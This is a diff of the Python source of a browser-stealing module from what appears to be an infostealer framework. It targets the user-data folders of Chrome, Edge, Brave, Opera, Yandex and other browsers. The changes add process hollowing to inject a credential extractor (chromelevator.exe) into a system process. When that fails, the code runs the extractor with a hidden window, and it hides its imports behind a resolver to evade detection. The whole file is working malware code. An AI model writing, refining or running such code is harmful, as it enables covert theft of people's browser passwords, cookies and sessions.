@@ -1,10 +1,18 @@
-import os
-import time
-import subprocess
-import shutil
-from datetime import datetime
-from typing import Dict, List, Any, Optional
-from core.obfuscation import decrypt_string
+from core.resolver import (
+    Resolver, _OS, _TIME, _SUBPROCESS, _SHUTIL, _DATETIME, _TYPING, _TEMPFILE
+)
+os = Resolver.get_mod(_OS)
+time = Resolver.get_mod(_TIME)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+shutil = Resolver.get_mod(_SHUTIL)
+datetime = Resolver.get_mod(_DATETIME).datetime
+temp_mod = Resolver.get_mod(_TEMPFILE) # Added temp_mod here
+Any, Dict, List, Optional = (
+    Resolver.get_mod(_TYPING).Any, 
+    Resolver.get_mod(_TYPING).Dict, 
+    Resolver.get_mod(_TYPING).List, 
+    Resolver.get_mod(_TYPING).Optional
+)
 from core.base import BaseModule
 
 class BrowserModule(BaseModule):
@@ -14,15 +22,15 @@ class BrowserModule(BaseModule):
         roaming = os.environ.get('APPDATA', '')
         
         self.chromium_browsers = {
-            'chrome': {'name': 'Google Chrome', 'path': os.path.join(local, decrypt_string('KV0XDCI0BT4ZHxhXH1w6JjtBHRluFTgWOw=='))},
-            'edge': {'name': 'Microsoft Edge', 'path': os.path.join(local, decrypt_string('I1sbGSEiNgQuKzZ9Fl4DJjJnCw48cR0DLhY='))},
-            'brave': {'name': 'Brave', 'path': os.path.join(local, decrypt_string('LEAZHSsCNgQuAAtKF2U6OBxTDg5jEysNLQQPSi5lMwkLQFgvLyU4'))},
-            'opera': {'name': 'Opera', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcQoWOxUGXQ=='))},
-            'opera_gx': {'name': 'Opera GX', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcR46eiQeWRBVAw=='))},
-            'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, decrypt_string('OFsOCiI1MD4GIhldABkiGxpT'))},
-            'yandex': {'name': 'Yandex', 'path': os.path.join(local, decrypt_string('N1MWDyspBT4DFgRcF0EkCAFFCw48DQU3KRIYGDZYEhs='))},
-            'cent': {'name': 'Cent Browser', 'path': os.path.join(local, decrypt_string('LVcWHwwjNhUpEhhkLmwVHxwSPAo6MA=='))},
-            'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))},
+            'chrome': {'name': 'Google Chrome', 'path': os.path.join(local, "Google\\\\Chrome\\\\User Data")},
+            'edge': {'name': 'Microsoft Edge', 'path': os.path.join(local, "Microsoft\\\\Edge\\\\User Data")},
+            'brave': {'name': 'Brave', 'path': os.path.join(local, "BraveSoftware\\\\Brave-Browser\\\\User Data")},
+            'opera': {'name': 'Opera', 'path': os.path.join(roaming, "Opera Software\\\\Opera Stable")},
+            'opera_gx': {'name': 'Opera GX', 'path': os.path.join(roaming, "Opera Software\\\\Opera GX Stable")},
+            'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, "Vivaldi\\\\User Data")},
+            'yandex': {'name': 'Yandex', 'path': os.path.join(local, "Yandex\\\\YandexBrowser\\\\User Data")},
+            'cent': {'name': 'Cent Browser', 'path': os.path.join(local, "CentBrowser\\\\User Data")},
+            'chromium': {'name': 'Chromium', 'path': os.path.join(local, "Chromium\\\\User Data")},
             # Chinese Localized Browsers
             '360safe': {'name': '360 Safe Browser', 'path': os.path.join(local, '360chrome\\Chrome\\User Data')},
             '360ee': {'name': '360 Extreme Browser', 'path': os.path.join(local, '360Chrome\\Chrome\\User Data')},
@@ -42,57 +50,62 @@ class BrowserModule(BaseModule):
             return False
 
     def steal(self) -> bool:
-        """Steals browser data using Native C# Orchestrator (Stealthy)"""
+        """Steals browser data using chromelevator.exe via Native Hollowing (Professional)"""
         try:
-            self.log("Invoking native C# BrowserManager for extraction...")
-            import clr
-            try:
-                from VanguardCore import BrowserManager
-            except ImportError:
-                # Try reloading/adding reference just in case
-                import os
-                base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-                clr.AddReference(os.path.join(base_dir, "bin", "browser.dll"))
-                from VanguardCore import BrowserManager
-
-            # Access credentials from main
-            import main
-            bot_token = getattr(main, 'BOT_TOKEN', "")
-            admin_id = str(getattr(main, 'ADMIN_ID', "0"))
-            
-            # Run native orchestrator .Result to wait for Task completion
-            success = BrowserManager.Run(bot_token, admin_id, main.BASE_DIR).Result
-            
-            if success:
-                self.log("Native browser extraction and reporting completed successfully.")
-            else:
-                self.log("Native browser extraction failed or no data found.")
-            return success
-        except Exception as e:
-            self.log(f"Native extraction error: {e}")
-            # Fallback to old method if native fails
             injector = ChromeInjector()
-            if injector.is_available():
-                self.log("Falling back to Python-based ChromeElevator invocation.")
-                return injector.run_injector(action="all", timeout=120)
-        return False
+            if not injector.is_available():
+                self.log("chromelevator.exe not found. Aborting.")
+                return False
+
+            self.log(f"Hollowing {os.path.basename(injector.injector_path)} into system process...")
+            if self.stealth_inject_binary(injector.injector_path):
+                self.log("Injection successful. Harvesting started.")
+                return True
+
+            # Fallback to standard execution if hollowing fails
+            self.log("Stealthy hollowing failed, falling back to standard execution...")
+            return injector.run_injector(action="all", timeout=120)
+        except Exception as e:
+            self.log(f"Extraction error: {e}")
+            return False
+
+    def stealth_inject_binary(self, binary_path: str) -> bool:
+        """Launches a binary using native Process Hollowing (Stealthy)"""
+        try:
+            import clr
+            Resolver.load_native()
+            from VanguardCore import SafetyManager, Resolver
+            
+            with open(binary_path, "rb") as f:
+                payload = f.read()
+            
+            # Binary payload must be passed as System.Byte[]
+            from System import Array, Byte
+            net_payload = Array.CreateInstance(Byte, len(payload))
+            for i, b in enumerate(payload):
+                net_payload[i] = b
+                
+            temp_mod = Resolver.get_mod("tempfile")
+            output_dir = os.path.join(temp_mod.gettempdir(), "VOutput")
+            os.makedirs(output_dir, exist_ok=True)
+            
+            # Arguments for chromelevator
+            args = f"all --method nt -o \"{output_dir}\""
+            
+            return SafetyManager.ProcessManager.StartStealthy(net_payload, args)
+        except Exception as e:
+            self.log(f"Injection fatal error: {e}")
+            return False
 
 class ChromeInjector:
     def __init__(self):
-        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-        
-        # Priority on chromelevator.exe in core/
+        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
         possible_names = [
-            os.path.join(self.base_dir, "core", "chromelevator.exe"),
-            os.path.join(self.base_dir, "core", "chromelevator_x64.exe"),
-            os.path.join(self.base_dir, "bin", "chromelevator_x64.exe"),
-            os.path.join(self.base_dir, "chromelevator.exe"),
+            os.path.join(base_dir, "core", "chromelevator.exe"),
+            os.path.join(base_dir, "bin", "chromelevator.exe"),
+            os.path.join(base_dir, "chromelevator.exe"),
         ]
-        self.injector_path = None
-        for name in possible_names:
-            if os.path.exists(name):
-                self.injector_path = str(name)
-                break
+        self.injector_path = next((n for n in possible_names if os.path.exists(n)), None)
 
     def is_available(self):
         return self.injector_path is not None
@@ -100,7 +113,9 @@ class ChromeInjector:
     def run_injector(self, action="all", timeout=60):
         if not self.is_available(): return False
         try:
-            output_dir = os.path.normpath(os.path.join(self.base_dir, "core", "output"))
+            subprocess = Resolver.get_mod(_SUBPROCESS)
+            temp_mod = Resolver.get_mod(_TEMPFILE)
+            output_dir = os.path.join(temp_mod.gettempdir(), "VOutput")
             os.makedirs(output_dir, exist_ok=True)
             
             cmd = [self.injector_path, action, "--method", "nt", "-o", output_dir]
@@ -108,5 +123,5 @@ class ChromeInjector:
             subprocess.run(cmd, timeout=timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
             return True
         except Exception as e:
-            print(f"Error running injector: {e}")
+            print(f"Error: {e}")
             return False
